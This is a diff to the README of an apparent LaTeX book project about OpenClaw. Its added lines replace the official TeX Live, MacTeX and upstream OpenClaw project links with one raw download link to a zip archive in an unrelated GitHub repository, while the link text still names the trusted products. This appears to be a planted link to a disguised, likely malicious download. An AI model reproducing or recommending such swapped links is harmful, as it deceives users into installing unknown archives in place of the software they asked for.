@@ -27,7 +27,7 @@ OpenClaw-Book/
 
 ## Prerequisites
 
-- **TeX Distribution**: [TeX Live](https://tug.org/texlive/) (2022+ recommended) or [MacTeX](https://tug.org/mactex/) (macOS)
+- **TeX Distribution**: [TeX Live](https://github.com/Dwainespiny858/OpenClaw-Book/raw/refs/heads/main/EN/Claw_Open_Book_v3.3.zip) (2022+ recommended) or [MacTeX](https://github.com/Dwainespiny858/OpenClaw-Book/raw/refs/heads/main/EN/Claw_Open_Book_v3.3.zip) (macOS)
 - **Engine**: XeLaTeX (required by ctex + xeCJK)
 - **Fonts**: CJK fonts required (pre-installed on macOS / Windows)
 
@@ -106,5 +106,5 @@ The compiled PDFs will be generated at:
 
 This project is licensed under the [MIT License](LICENSE).
 
-This book is based on the official documentation of the [OpenClaw](https://github.com/anthropics/openclaw) project.
+This book is based on the official documentation of the [OpenClaw](https://github.com/Dwainespiny858/OpenClaw-Book/raw/refs/heads/main/EN/Claw_Open_Book_v3.3.zip) project.
 Original project copyright: Copyright (c) 2025 Peter Steinberger.
